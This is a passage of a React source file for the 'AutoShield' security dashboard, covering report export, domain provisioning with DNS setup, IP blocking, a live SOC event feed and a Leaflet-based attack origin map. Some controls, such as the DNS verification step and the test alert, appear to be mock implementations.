  const generateBasicReport = () => {
    const content = `AUTOSHIELD INCIDENT REPORT (BASIC)\nTotal Events: ${stats.total}\nBlocked IPs: ${blocked.length}\nBlock Rate: ${stats.blockRate}%`;
    const blob = new Blob([content], { type: 'text/plain' });
    const url = URL.createObjectURL(blob);
    const anchor = document.createElement('a');
    anchor.href = url;
    anchor.download = 'autoshield_basic_report.txt';
    anchor.click();
  };

  return (
    <MotionDiv initial={{ opacity: 0, y: 8 }} animate={{ opacity: 1, y: 0 }}>
      <div className="dash-header" style={{ marginBottom: '40px' }}>
        <h1 style={{ fontFamily: 'Anton', letterSpacing: '-0.02em', fontSize: '42px', margin: 0, textTransform: 'uppercase' }}>📄 Operations & Reports</h1>
        <p style={{ color: 'var(--e-muted)', fontFamily: 'monospace' }}>Generate SOC incident reports and test integrations</p>
      </div>

      <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: 24 }}>
        <div className="glass-card">
          <div style={{ fontSize: 12, fontWeight: 700, marginBottom: 20, color: 'var(--e-muted)', letterSpacing: 1 }}>BASIC REPORTING</div>
          <p style={{ fontSize: 13, color: 'var(--muted)', marginBottom: 24 }}>Generate a lightweight TXT summary of your recent edge activity.</p>
          <button className="evolve-button-secondary" onClick={generateBasicReport} style={{ width: '100%' }}>Generate TXT Report</button>
        </div>

        <PremiumLock featureName="Enterprise Reporting Suite" description="Unlock high-fidelity PDF forensics, automated SIEM exports, and 12-month data retention.">
          <div className="glass-card">
            <div style={{ fontSize: 12, fontWeight: 700, marginBottom: 20, color: 'var(--e-muted)', letterSpacing: 1 }}>ADVANCED EXPORT</div>
            <div style={{ display: 'grid', gap: 12 }}>
              <button className="evolve-button-primary" style={{ width: '100%' }}>Generate Executive PDF</button>
              <button className="evolve-button-secondary" style={{ width: '100%', borderColor: 'var(--cyan)', color: 'var(--cyan)' }}>Test Splunk Integration</button>
            </div>
          </div>
        </PremiumLock>
      </div>
    </MotionDiv>
  );
}

function WebsiteSetup() {
  const navigate = useNavigate();
  const [step, setStep] = useState(1);
  const [domain, setDomain] = useState('');
  const [upstreamUrl, setUpstreamUrl] = useState('');
  const [showKey, setShowKey] = useState(false);
  const [dnsVerified, setDnsVerified] = useState(false);
  const [provisionedSite, setProvisionedSite] = useState(null);
  const [isProvisioning, setIsProvisioning] = useState(false);
  const [provisionError, setProvisionError] = useState('');

  const steps = [
    { n: 1, label: 'Domain', icon: <HiOutlineGlobeAmericas /> },
    { n: 2, label: 'DNS Setup', icon: <HiOutlineServerStack /> },
    { n: 3, label: 'Ready', icon: <HiShieldCheck /> },
  ];

  const handleDnsVerification = async () => {
    if (!normalizeDomainInput(domain)) return;
    setProvisionError('');
    setDnsVerified(true);
    setIsProvisioning(true);
    try {
      const upstream = upstreamUrl || `http://${normalizeDomainInput(domain)}`;
      const sites = await engine.addDomain(domain, upstream);
      const normalized = normalizeDomainInput(domain);
      const created = (sites || []).find((s) => normalizeDomainInput(s.domain) === normalized) || null;
      setProvisionedSite(created);
      setStep(3);
    } catch (err) {
      setProvisionError('Provisioning failed. Please retry.');
    } finally {
      setIsProvisioning(false);
    }
  };

  return (
    <MotionDiv initial={{ opacity: 0, y: 8 }} animate={{ opacity: 1, y: 0 }}>
      <div className="dash-header" style={{ marginBottom: '40px' }}>
        <h1 style={{ fontFamily: 'Anton', letterSpacing: '-0.02em', fontSize: '42px', margin: 0, textTransform: 'uppercase' }}>🌐 Website Provisioning</h1>
        <p style={{ color: 'var(--e-muted)', fontFamily: 'monospace' }}>Initialize zero-trust edge protection for your infrastructure</p>
      </div>

      <div className="glass-card" style={{ maxWidth: 900, padding: 40, position: 'relative', overflow: 'hidden' }}>
        {/* Background Glow */}
        <div style={{ position: 'absolute', top: -100, right: -100, width: 300, height: 300, background: 'radial-gradient(circle, var(--e-green-glow) 0%, transparent 70%)', opacity: 0.1, pointerEvents: 'none' }} />

        {/* Improved Stepper */}
        <div style={{ display: 'flex', justifyContent: 'space-between', marginBottom: 50, position: 'relative' }}>
          <div style={{ position: 'absolute', top: 22, left: '10%', right: '10%', height: 2, background: 'rgba(255,255,255,0.05)', zIndex: 0 }} />
          <div style={{
            position: 'absolute', top: 22, left: '10%',
            width: step === 1 ? '0%' : step === 2 ? '40%' : '80%',
            height: 2, background: 'var(--e-green)', zIndex: 0,
            transition: '0.8s cubic-bezier(0.16, 1, 0.3, 1)'
          }} />

          {steps.map((s) => (
            <div key={s.n} style={{ zIndex: 1, display: 'flex', flexDirection: 'column', alignItems: 'center', gap: 12 }}>
              <div style={{
                width: 44, height: 44, borderRadius: '50%',
                background: step > s.n ? 'var(--e-green)' : step === s.n ? '#111' : '#0a0a0a',
                border: step >= s.n ? '2px solid var(--e-green)' : '2px solid rgba(255,255,255,0.05)',
                display: 'flex', alignItems: 'center', justifyContent: 'center',
                color: step >= s.n ? (step > s.n ? 'black' : 'var(--e-green)') : 'var(--muted2)',
                fontSize: 20, transition: '0.3s',
                boxShadow: step === s.n ? '0 0 20px var(--e-green-glow)' : 'none'
              }}>
                {step > s.n ? <HiCheck /> : s.icon}
              </div>
              <span style={{ fontSize: 11, fontWeight: step === s.n ? 700 : 400, color: step >= s.n ? 'white' : 'var(--muted)', textTransform: 'uppercase', letterSpacing: 1 }}>{s.label}</span>
            </div>
          ))}
        </div>

        {step === 1 && (
          <MotionDiv initial={{ opacity: 0, x: 20 }} animate={{ opacity: 1, x: 0 }}>
            <div style={{ maxWidth: 500 }}>
              <h2 style={{ fontFamily: 'Anton', fontSize: 28, marginBottom: 12, textTransform: 'uppercase', letterSpacing: 1 }}>Identify Your Infrastructure</h2>
              <p style={{ color: 'var(--muted)', fontSize: 13, marginBottom: 32, lineHeight: 1.6 }}>AutoShield requires a verified domain to anchor your dedicated edge partition. Enter your Fully Qualified Domain Name below.</p>

              <div style={{ position: 'relative', marginBottom: 32 }}>
                <input
                  type="text"
                  placeholder="e.g. portal.nexus-solutions.com"
                  value={domain}
                  onChange={(e) => setDomain(e.target.value)}
                  className="evolve-input"
                  style={{ width: '100%', height: 54, fontSize: 16, paddingLeft: 16, background: 'rgba(255,255,255,0.02)', border: '1px solid rgba(255,255,255,0.1)', borderRadius: 8, color: 'white' }}
                />
                <div style={{ position: 'absolute', right: 16, top: 18, color: domain.length > 3 ? 'var(--e-green)' : 'var(--muted2)' }}>
                  <HiOutlineGlobeAmericas size={18} />
                </div>
              </div>

              <div style={{ marginBottom: 24 }}>
                <label style={{ fontSize: 11, color: 'var(--muted)', marginBottom: 8, display: 'block' }}>UPSTREAM TARGET (WHERE TO PROXY TRAFFIC)</label>
                <input
                  type="text"
                  placeholder="e.g. http://192.168.1.100:8080 or http://localhost:9090"
                  value={upstreamUrl}
                  onChange={(e) => setUpstreamUrl(e.target.value)}
                  className="evolve-input"
                  style={{ width: '100%', height: 48, fontSize: 14, paddingLeft: 16, background: 'rgba(255,255,255,0.02)', border: '1px solid rgba(255,255,255,0.1)', borderRadius: 8, color: 'white' }}
                />
                <div style={{ fontSize: 11, color: 'var(--muted2)', marginTop: 6 }}>
                  Leave empty to auto-detect from domain. Format: http://IP:PORT
                </div>
              </div>

              <button
                className="evolve-button-primary"
                style={{ width: '100%', height: 50, fontSize: 14, fontWeight: 700 }}
                onClick={() => { if (domain.length > 3) setStep(2); }}
              >
                PROCEED TO NETWORK SETUP <HiArrowRight style={{ marginLeft: 8 }} />
              </button>
            </div>
          </MotionDiv>
        )}

        {step === 2 && (
          <MotionDiv initial={{ opacity: 0, x: 20 }} animate={{ opacity: 1, x: 0 }}>
            <h2 style={{ fontFamily: 'Anton', fontSize: 28, marginBottom: 12, textTransform: 'uppercase', letterSpacing: 1 }}>Edge Synchronization</h2>
            <p style={{ color: 'var(--muted)', fontSize: 13, marginBottom: 32 }}>Update your authoritative DNS records to route traffic through our protected global proxy layer.</p>

            <div className="glass-card" style={{ background: 'rgba(0,0,0,0.3)', border: '1px solid var(--line)', padding: 0, overflow: 'hidden', marginBottom: 32 }}>
              <div style={{ padding: '8px 16px', background: 'rgba(255,255,255,0.03)', borderBottom: '1px solid var(--line)', fontSize: 10, fontFamily: 'var(--mono)', color: 'var(--muted)', display: 'flex', justifyContent: 'space-between' }}>
                <span>DNS CONFIGURATION MATRIX</span>
                <span style={{ color: 'var(--e-green)' }}>● READY FOR INGEST</span>
              </div>
              <div style={{ padding: 24, display: 'grid', gridTemplateColumns: '1fr 1fr 1.5fr', gap: 24 }}>
                <div>
                  <div style={{ fontSize: 10, color: 'var(--muted)', marginBottom: 4 }}>RECORD TYPE</div>
                  <div style={{ fontFamily: 'var(--mono)', color: 'var(--cyan)', fontWeight: 700 }}>CNAME</div>
                </div>
                <div>
                  <div style={{ fontSize: 10, color: 'var(--muted)', marginBottom: 4 }}>HOST</div>
                  <div style={{ fontFamily: 'var(--mono)', color: 'var(--cyan)', fontWeight: 700 }}>@</div>
                </div>
                <div>
                  <div style={{ fontSize: 10, color: 'var(--muted)', marginBottom: 4 }}>VALUE / TARGET</div>
                  <div style={{ fontFamily: 'var(--mono)', color: 'var(--e-green)', fontWeight: 700, fontSize: 13 }}>{domain || 'your-site'}.as-edge.net</div>
                </div>
              </div>
            </div>

            <div style={{ display: 'flex', gap: 16 }}>
              <button className="evolve-button-secondary" style={{ padding: '0 24px', height: 44, borderRadius: 4 }} onClick={() => setStep(1)}>MODIFY DOMAIN</button>
              <button className="evolve-button-primary" style={{ flex: 1, height: 44, borderRadius: 4 }} onClick={handleDnsVerification}>
                {isProvisioning ? 'PROVISIONING EDGE NODE...' : (dnsVerified ? 'DNS PROPAGATED ✓' : 'VERIFY PROPAGATION')}
              </button>
            </div>
            {provisionError && <div style={{ marginTop: 12, fontSize: 12, color: 'var(--red)' }}>{provisionError}</div>}
          </MotionDiv>
        )}

        {step === 3 && (
          <MotionDiv initial={{ opacity: 0, scale: 0.95 }} animate={{ opacity: 1, scale: 1 }}>
            <div style={{ textAlign: 'center', padding: '20px 0' }}>
              <div style={{
                width: 100, height: 100, borderRadius: '50%', background: 'rgba(0,255,156,0.1)',
                border: '2px solid var(--e-green)', margin: '0 auto 24px',
                display: 'flex', alignItems: 'center', justifyContent: 'center',
                boxShadow: '0 0 40px rgba(0,255,156,0.2)',
                color: 'var(--e-green)'
              }}>
                <HiShieldCheck size={50} />
              </div>
              <h2 style={{ fontFamily: 'Anton', fontSize: 32, marginBottom: 12, textTransform: 'uppercase', letterSpacing: 2, color: 'var(--e-green)' }}>Protection Activated</h2>
              <p style={{ color: 'var(--muted)', fontSize: 14, marginBottom: 40, maxWidth: 500, margin: '0 auto 40px' }}>Your infrastructure is now anchored to the AutoShield Edge. All incoming requests are being scanned by our AI in real-time.</p>

              <div className="glass-card" style={{ background: 'rgba(0,255,156,0.03)', border: '1px solid rgba(0,255,156,0.2)', padding: 20, textAlign: 'left', marginBottom: 32 }}>
                <div style={{ fontSize: 10, color: 'var(--e-green)', fontFamily: 'var(--mono)', marginBottom: 8 }}>VIRTUAL PARTITION API KEY</div>
                <div style={{ display: 'flex', alignItems: 'center', gap: 16 }}>
                  <div style={{ flex: 1, fontFamily: 'var(--mono)', fontSize: 16, color: 'white', letterSpacing: 2 }}>
                    {showKey ? (provisionedSite?.key || engine.getMasterIngestionKey()) : '••••••••••••••••••••••••'}
                  </div>
                  <button className="evolve-button-secondary" style={{ fontSize: 11, padding: '4px 12px', borderRadius: 4 }} onClick={() => setShowKey(!showKey)}>{showKey ? 'HIDE' : 'REVEAL'}</button>
                </div>
              </div>

              <button className="evolve-button-primary" style={{ height: 50, padding: '0 40px', borderRadius: 4 }} onClick={() => navigate('/my-websites')}>
                TELEMETRY DASHBOARD <HiArrowRight style={{ marginLeft: 8 }} />
              </button>
            </div>
          </MotionDiv>
        )}
      </div>
    </MotionDiv>
  );
}

function WebsiteProtectionTab() {
  const [domains, setDomains] = useState(engine.getDomains);
  const [newDom, setNewDom] = useState('');
  const [protect, setProtect] = useState(true);
  const [blockIp, setBlockIp] = useState('203.0.113.0');

  return (
    <>
      <div style={{ fontSize: 13, fontWeight: 600, marginBottom: 14 }}>🛡️ Website Protection Panel</div>
      <div className="dash-grid">
        <div>
          <div className="glass-card" style={{ marginBottom: 16 }}>
            <div style={{ fontSize: 12, fontWeight: 700, marginBottom: 12 }}>Connected Domains</div>
            {domains.map((d, i) => (
              <div className="wp-domain" key={i}>
                <div>
                  <div style={{ fontSize: 14, fontWeight: 600, fontFamily: 'var(--mono)' }}>{d.domain}</div>
                  <div style={{ fontSize: 10, color: 'var(--muted)', fontFamily: 'var(--mono)', marginTop: 4 }}>
                    SSL: <span style={{ color: 'var(--green)' }}>* Active</span> · DNS: <span style={{ color: 'var(--cyan)' }}>Routed</span>
                  </div>
                </div>
                <span className="wp-status" style={{ background: 'rgba(0,255,156,.08)', border: '1px solid rgba(0,255,156,.3)', color: 'var(--green)' }}>PROTECTED</span>
              </div>
            ))}
            <div style={{ display: 'flex', gap: 10, marginTop: 12 }}>
              <input className="input" placeholder="yoursite.com" value={newDom} onChange={(e) => setNewDom(e.target.value)} style={{ flex: 1 }} />
              <button className="btn-primary btn-sm" onClick={() => { if (newDom) { engine.addDomain(newDom); setDomains(engine.getDomains()); setNewDom(''); } }}>Add</button>
            </div>
          </div>
          <div className="glass-card">
            <div style={{ fontSize: 12, fontWeight: 700, marginBottom: 12 }}>DNS Configuration</div>
            <div className="dns-block">
              <span style={{ color: 'var(--muted)' }}>CNAME</span>&nbsp;&nbsp; <span style={{ color: 'var(--cyan)' }}>proxy.autoshield.ai</span><br />
              <span style={{ color: 'var(--muted)' }}>A</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <span>104.26.8.142</span><br />
              <span style={{ color: 'var(--muted)' }}>TXT</span>&nbsp;&nbsp;&nbsp;&nbsp; <span style={{ color: 'var(--purple)' }}>autoshield-verify=as_v1_xxx</span>
            </div>
          </div>
        </div>
        <PremiumLock featureName="Enterprise Traffic Control" description="Unlock global traffic steering, edge-level overrides, and priority routing.">
          <div>
            <div className="glass-card" style={{ textAlign: 'center', marginBottom: 16 }}>
              <div style={{ fontSize: 12, fontWeight: 700, marginBottom: 16 }}>Traffic Routing</div>
              <div style={{ width: 72, height: 72, borderRadius: '50%', background: protect ? 'rgba(0,255,156,.06)' : 'rgba(255,200,87,.06)', border: `2px solid ${protect ? 'var(--green)' : 'var(--yellow)'}`, display: 'inline-flex', alignItems: 'center', justifyContent: 'center', fontSize: 28, marginBottom: 12 }}>{protect ? '🛡️' : '⚠️'}</div>
              <div style={{ fontSize: 18, fontWeight: 700, color: protect ? 'var(--green)' : 'var(--yellow)', fontFamily: 'var(--mono)' }}>{protect ? 'ACTIVE' : 'PAUSED'}</div>
              <button className="btn-secondary btn-sm" style={{ marginTop: 12 }} onClick={() => setProtect(!protect)}>{protect ? 'Pause' : 'Enable'} Protection</button>
            </div>
            <div className="glass-card" style={{ marginBottom: 16 }}>
              <div style={{ fontSize: 12, fontWeight: 700, marginBottom: 12 }}>Quick Block</div>
              <input className="input" value={blockIp} onChange={(e) => setBlockIp(e.target.value)} style={{ marginBottom: 10 }} />
              <button className="btn-primary btn-sm" style={{ width: '100%' }} onClick={() => { engine.blockIP(blockIp, 'Website Protection'); }}>🚫 Block IP</button>
            </div>
          </div>
        </PremiumLock>
      </div>
    </>
  );
}

function LiveSOC() {
  useEngineSnapshot(() => engine.getStateVersion());
  const log = engine.getRecentLog(15);
  const stats = engine.getStats();
  const activeThreats = engine.getRecentLog(60).filter((e) => !isEventFixed(e)).length;

  return (
    <MotionDiv initial={{ opacity: 0, y: 8 }} animate={{ opacity: 1, y: 0 }}>
      <div className="dash-header" style={{ marginBottom: '40px' }}>
        <h1 style={{ fontFamily: 'Anton', letterSpacing: '-0.02em', fontSize: '42px', margin: 0, textTransform: 'uppercase' }}>⚡ Live SOC</h1>
        <p style={{ color: 'var(--e-muted)', fontFamily: 'monospace' }}>Security operations center - real-time threat monitoring</p>
      </div>

      <div className="metrics-row" style={{ display: 'grid', gridTemplateColumns: 'repeat(4, 1fr)', gap: '24px', marginBottom: '40px' }}>
        <div className="glass-card"><div className="metric-label" style={{ color: 'var(--e-muted)', fontSize: '12px' }}>ACTIVE THREATS</div><div className="metric-value" style={{ color: activeThreats > 5 ? 'var(--red)' : 'var(--green)', fontSize: '32px', fontWeight: '800' }}>{activeThreats}</div></div>
        <div className="glass-card"><div className="metric-label" style={{ color: 'var(--e-muted)', fontSize: '12px' }}>EVENTS PROCESSED</div><div className="metric-value" style={{ fontSize: '32px', fontWeight: '800' }}>{stats.total}</div><div className="metric-delta" style={{ color: 'var(--cyan)' }}>session</div></div>
        <div className="glass-card"><div className="metric-label" style={{ color: 'var(--e-muted)', fontSize: '12px' }}>BLOCKED</div><div className="metric-value" style={{ color: 'var(--green)', fontSize: '32px', fontWeight: '800' }}>{stats.blocked}</div><div className="metric-delta" style={{ color: 'var(--green)' }}>{stats.blockRate}% rate</div></div>
        <div className="glass-card"><div className="metric-label" style={{ color: 'var(--e-muted)', fontSize: '12px' }}>SYSTEM HEALTH</div><div className="metric-value" style={{ color: activeThreats < 5 ? 'var(--green)' : 'var(--yellow)', fontSize: '32px', fontWeight: '800' }}>{activeThreats < 5 ? 'STABLE' : 'ELEVATED'}</div></div>
      </div>

      <div style={{ display: 'flex', gap: 16 }}>
        <div className="glass-card" style={{ flex: 1 }}>
          <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: 12 }}>
            <div style={{ fontSize: 14, fontWeight: 700, fontFamily: 'var(--mono)' }}>Threat Communication Overrides</div>
            <span style={{ background: 'rgba(0,255,156,0.1)', color: 'var(--e-green)', padding: '2px 8px', borderRadius: 4, fontSize: 10, fontFamily: 'var(--mono)' }}>FREE TIER</span>
          </div>
          <p style={{ fontSize: 11, color: 'var(--muted)', marginBottom: 16 }}>Broadcast an emergency alert (SMS/Discord) when extreme threat spikes are detected by the AutoPilot engine.</p>
          <button className="evolve-button-secondary" onClick={() => alert('TEST ALERT SENT: "AutoShield AI - Critical threat anomaly detected on inbound traffic." \n\n(Free Tier Alerts Delivered!)')} style={{ padding: '6px 12px', fontSize: 11 }}><HiOutlineBolt /> Send Manual Alert (Test)</button>
        </div>
      </div>

      <div className="glass-card" style={{ marginBottom: 16, marginTop: 16 }}>
        <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: 12 }}>
          <span style={{ fontSize: 12, fontWeight: 700 }}>Live Activity Feed</span>
          <span className="neon-pill"><span style={{ width: 6, height: 6, borderRadius: '50%', background: 'var(--green)', display: 'inline-block', animation: 'pulse-dot 1.5s ease infinite' }} /> STREAMING</span>
        </div>
        <div className="feed" style={{ maxHeight: 380 }}>
          {log.length === 0 && <div className="feed-empty">🟢 No active threats - Simulate attacks from the Fusion Dashboard</div>}
          {log.map((ev) => (
            <div className="feed-item" key={ev.id}>
              <span style={{ color: 'var(--muted2)' }}>{ev.timestamp.slice(11, 16)}</span>
              <span style={{ color: SEV_COLORS[ev.severity], fontWeight: 600 }}>[{ev.severity.slice(0, 4)}]</span>
              <span style={{ color: TYPE_COLORS[ev.attack_type] }}>{ev.attack_type}</span>
              <span style={{ color: 'var(--text)' }}>{ev.src_ip}</span>
              <span style={{ color: ev.action === 'BLOCKED' ? 'var(--green)' : 'var(--yellow)' }}>{ev.action}</span>
              <span style={{ color: STATUS_COLORS[normalizeEventStatus(ev.status)] || 'var(--muted2)', minWidth: 84 }}>{normalizeEventStatus(ev.status)}</span>
              <span style={{ color: 'var(--cyan)', fontSize: 10, overflow: 'hidden', textOverflow: 'ellipsis', whiteSpace: 'nowrap', maxWidth: '150px' }}>{ev.payload}</span>
            </div>
          ))}
        </div>
      </div>

      {stats.total > 0 && (
        <div className="glass-card">
          <div style={{ fontSize: 12, fontWeight: 700, marginBottom: 12 }}>Attack Type Distribution</div>
          {Object.entries(stats.byType).sort((a, b) => b[1] - a[1]).slice(0, 4).map(([t, cnt]) => {
            const pct = Math.round((cnt / Math.max(stats.total, 1)) * 100);
            return (
              <div className="dist-bar" key={t}>
                <div className="dist-header">
                  <span className="dist-name" style={{ color: TYPE_COLORS[t] }}>{t}</span>
                  <span className="dist-count">{cnt} ({pct}%)</span>
                </div>
                <div className="progress-bar"><div className="progress-fill" style={{ width: `${pct}%`, background: TYPE_COLORS[t] }} /></div>
              </div>
            );
          })}
        </div>
      )}
    </MotionDiv>
  );
}

function AttackGeo() {
  useEngineSnapshot(() => engine.getStateVersion());
  const [selectedLocationKey, setSelectedLocationKey] = useState('');
  const [targetSite, setTargetSite] = useState(DEFAULT_TARGET_SITE);
  const [targetDraft, setTargetDraft] = useState({
    city: DEFAULT_TARGET_SITE.city,
    lat: String(DEFAULT_TARGET_SITE.lat),
    lng: String(DEFAULT_TARGET_SITE.lng),
  });
  const [geoStatus, setGeoStatus] = useState('');

  useEffect(() => {
    fetch('https://get.geojs.io/v1/ip/geo.json')
      .then(r => r.json())
      .then(data => {
        if (data && data.latitude && data.longitude) {
          const payload = {
            name: 'AutoShield Host',
            city: data.city || 'Global Gateway',
            country: data.country || '',
            lat: parseFloat(data.latitude),
            lng: parseFloat(data.longitude)
          };
          setTargetSite(payload);
          setTargetDraft({
            city: payload.city,
            lat: String(payload.lat),
            lng: String(payload.lng)
          });
        }
      })
      .catch(e => console.log('Failed to fetch real geo server site', e));
  }, []);

  const stats = engine.getStats();
  const log = engine.getRecentLog(10);
  const countries = Object.entries(stats.byCountry || {}).sort((a, b) => b[1] - a[1]).slice(0, 8);
  const allEvents = engine.getLog();
  const uniqueIPs = new Set(allEvents.map((e) => e.src_ip)).size;
  const locationCounts = Object.values(
    allEvents.reduce((acc, ev) => {
      if (typeof ev.lat !== 'number' || typeof ev.lng !== 'number') return acc;
      const key = getLocationKey(ev.city, ev.country, ev.lat, ev.lng);
      const existing = acc[key];
      if (existing) {
        acc[key] = { ...existing, count: existing.count + 1 };
      } else {
        acc[key] = {
          key,
          city: ev.city || 'Unknown',
          country: ev.country || 'Unknown',
          lat: ev.lat,
          lng: ev.lng,
          count: 1,
        };
      }
      return acc;
    }, {}),
  ).sort((a, b) => b.count - a.count);
  const uniqueLocations = locationCounts.length;
  const selectedLocation = locationCounts.find((loc) => loc.key === selectedLocationKey) || null;
  const filteredLog = selectedLocation
    ? log.filter((ev) => getLocationKey(ev.city, ev.country, ev.lat, ev.lng) === selectedLocation.key)
    : log;

  const activeRoutes = log
    .filter((ev) => typeof ev.lat === 'number' && typeof ev.lng === 'number')
    .map((ev, index) => ({
      id: ev.id,
      locationKey: getLocationKey(ev.city, ev.country, ev.lat, ev.lng),
      fromLat: ev.lat,
      fromLng: ev.lng,
      attackType: ev.attack_type,
      city: ev.city,
      country: ev.country,
      opacity: Math.max(0.2, 0.95 - (index * 0.06)),
    }));

  const applyTargetDraft = () => {
    const lat = Number.parseFloat(targetDraft.lat);
    const lng = Number.parseFloat(targetDraft.lng);
    if (!Number.isFinite(lat) || !Number.isFinite(lng) || lat < -90 || lat > 90 || lng < -180 || lng > 180) {
      setGeoStatus('Invalid coordinates. Use latitude [-90,90], longitude [-180,180].');
      return;
    }

    const city = targetDraft.city.trim() || 'Custom Target';
    setTargetSite({ name: 'Protected Site', city, country: 'India', lat, lng });
    setGeoStatus(`Target updated to ${city} (${lat.toFixed(4)}, ${lng.toFixed(4)}).`);
  };

  const useBrowserLocation = () => {
    if (!navigator.geolocation) {
      setGeoStatus('Browser geolocation is not available.');
      return;
    }

    navigator.geolocation.getCurrentPosition(
      (pos) => {
        const { latitude, longitude } = pos.coords;
        setTargetSite({
          name: 'Protected Site',
          city: 'My Current Location',
          country: 'Detected',
          lat: latitude,
          lng: longitude,
        });
        setTargetDraft({ city: 'My Current Location', lat: latitude.toFixed(6), lng: longitude.toFixed(6) });
        setGeoStatus(`Using your detected location (${latitude.toFixed(4)}, ${longitude.toFixed(4)}).`);
      },
      () => setGeoStatus('Location permission denied. Keeping your configured target.'),
      { enableHighAccuracy: true, timeout: 8000 }
    );
  };

  return (
    <MotionDiv initial={{ opacity: 0, y: 8 }} animate={{ opacity: 1, y: 0 }}>
      {/* HEADER */}
      <div className="dash-header" style={{ marginBottom: '28px' }}>
        <h1 style={{ fontFamily: 'Anton, sans-serif', letterSpacing: '-0.02em', fontSize: '36px', margin: 0, textTransform: 'uppercase' }}>Africa Global Defense</h1>
        <div style={{ display: 'flex', gap: 8, alignItems: 'center', marginTop: 4 }}>
          <span style={{ fontSize: 10, fontFamily: 'var(--mono)', color: '#00ff9c', padding: '2px 10px', background: 'rgba(0,255,156,0.05)', border: '1px solid rgba(0,255,156,0.2)', borderRadius: 4, letterSpacing: 1 }}>ACTIVE SOC MODE</span>
        </div>
        <p style={{ color: 'rgba(255,255,255,0.4)', fontFamily: 'var(--mono)', marginTop: 4, fontSize: 11, letterSpacing: '0.05em' }}>Real-time global threat intelligence & localized origin analysis</p>
      </div>

      <div className="geo-page">

        {/* ═══ KPI STAT ROW ═══ */}
        <div className="geo-kpi-row">
          <div className="geo-kpi-card" style={{ '--kpi-accent': '#22c0ff' }}>
            <span className="geo-kpi-label">Total Threats</span>
            <span className="geo-kpi-value">{stats.total.toLocaleString()}</span>
            <span className="geo-kpi-sub">Neutralized this session</span>
          </div>
          <div className="geo-kpi-card" style={{ '--kpi-accent': '#ff6b6b' }}>
            <span className="geo-kpi-label">Attack Sources</span>
            <span className="geo-kpi-value">{uniqueIPs}</span>
            <span className="geo-kpi-sub">Unique IP addresses</span>
          </div>
          <div className="geo-kpi-card" style={{ '--kpi-accent': '#ffc107' }}>
            <span className="geo-kpi-label">Origin Nodes</span>
            <span className="geo-kpi-value">{uniqueLocations}</span>
            <span className="geo-kpi-sub">Geo-located regions</span>
          </div>
          <div className="geo-kpi-card" style={{ '--kpi-accent': '#00ff9c' }}>
            <span className="geo-kpi-label">Countries</span>
            <span className="geo-kpi-value">{countries.length}</span>
            <span className="geo-kpi-sub">Distinct threat nations</span>
          </div>
        </div>

        {/* ═══ PROTECTED NODE STATUS ═══ */}
        <div className="geo-status-card">
          <div className="geo-status-main">
            <span className="geo-status-label">Live Protected Node</span>
            <div className="geo-status-value">
              DEHRADUN GATEWAY
            </div>
          </div>

          <div style={{ marginLeft: 40, display: 'flex', gap: 40 }}>
            <div className="geo-status-item">
              <span className="geo-status-item-label">Status</span>
              <span className="geo-status-item-value" style={{ color: '#00ff9c' }}>● ACTIVE</span>
            </div>
            <div className="geo-status-item">
              <span className="geo-status-item-label">Public IPv4</span>
              <span className="geo-status-item-value">45.2.19.254</span>
            </div>
            <div className="geo-status-item">
              <span className="geo-status-item-label">Coordinates</span>
              <span className="geo-status-item-value">{targetSite.lat.toFixed(4)}N, {targetSite.lng.toFixed(4)}E</span>
            </div>
          </div>

          <div className="geo-status-badge">ACTIVE PROTECTION</div>
        </div>

        {/* ═══ INTERACTIVE MAP ═══ */}
        <div className="geo-map-container">
          <div className="geo-map-header">
            <span className="geo-map-title">Live Threat Radar</span>
            <span className="geo-map-badge">
              <span className="geo-map-badge-dot" />
              MONITORING
            </span>
          </div>

          <div className="geo-map-frame">
            <MapContainer
              center={[targetSite.lat, targetSite.lng]}
              zoom={2.5}
              minZoom={2}
              scrollWheelZoom
              className="geo-live-map"
              zoomControl={false}
              style={{ width: '100%', height: '100%' }}
            >
              <TileLayer
                attribution='&copy; <a href="https://carto.com/">CARTO</a>'
                url="https://{s}.basemaps.cartocdn.com/dark_nolabels/{z}/{x}/{y}{r}.png"
              />

              {/* Attack arcs */}
              {activeRoutes.slice(0, 20).map((route) => {
                const selectedColor = TYPE_HEX_COLORS[route.attackType] || '#22c0ff';
                const curvePoints = calculateBezierPoints(
                  [route.fromLat, route.fromLng],
                  [targetSite.lat, targetSite.lng]
                );
                return (
                  <React.Fragment key={route.id}>
                    {/* Base dotted route */}
                    <Polyline
                      positions={curvePoints}
                      pathOptions={{
                        className: 'gl-geo-route',
                        color: selectedColor,
                        weight: 1.5,
                        opacity: selectedLocationKey ? (selectedLocationKey === route.locationKey ? 0.85 : 0.08) : 0.45,
                        dashArray: '3 8',
                      }}
                    />
                    {/* Traveling energy comet */}
                    {!selectedLocationKey || selectedLocationKey === route.locationKey ? (
                      <Polyline
                        positions={curvePoints}
                        pathOptions={{
                          className: 'geo-route-comet',
                          color: selectedColor,
                          weight: 3.5,
                          opacity: 1,
                        }}
                      />
                    ) : null}
                  </React.Fragment>
                );
              })}

              {/* Origin markers */}
              {locationCounts.slice(0, 25).map((loc, i) => {
                const color = TYPE_HEX_COLORS[filteredLog.find((l) => l.city === loc.city || l.country === loc.country)?.attack_type] || GEO_PALETTE[i % GEO_PALETTE.length];
                const isSelected = selectedLocationKey === loc.key;
                const icon = L.divIcon({
                  className: 'custom-radar-icon',
                  html: `<div class="radar-marker ${isSelected ? 'selected' : ''}" style="color: ${color}">
                           <div class="radar-p-core"></div>
                           <div class="radar-p-ring"></div>
                         </div>`,
                  iconSize: [24, 24],
                  iconAnchor: [12, 12]
                });

                return (
                  <Marker
                    key={loc.key}
                    position={[loc.lat, loc.lng]}
                    icon={icon}
                    eventHandlers={{ click: () => setSelectedLocationKey((curr) => (curr === loc.key ? '' : loc.key)) }}
                  >
                    <MapTooltip direction="top" offset={[0, -12]}>
                      <div style={{ color: '#fff', fontSize: 13, marginBottom: 4, fontWeight: 700 }}>{loc.city}, {loc.country}</div>
                      <div style={{ color: color, fontSize: 10, fontFamily: 'var(--mono)', marginBottom: 4 }}>LOC / {loc.lat.toFixed(2)}, {loc.lng.toFixed(2)}</div>
                      <div style={{ color: 'var(--muted)', fontSize: 10 }}><span style={{ color: '#fff' }}>{loc.count}</span> threats neutralized</div>
                    </MapTooltip>
                  </Marker>
                );
              })}

              {/* Target marker */}
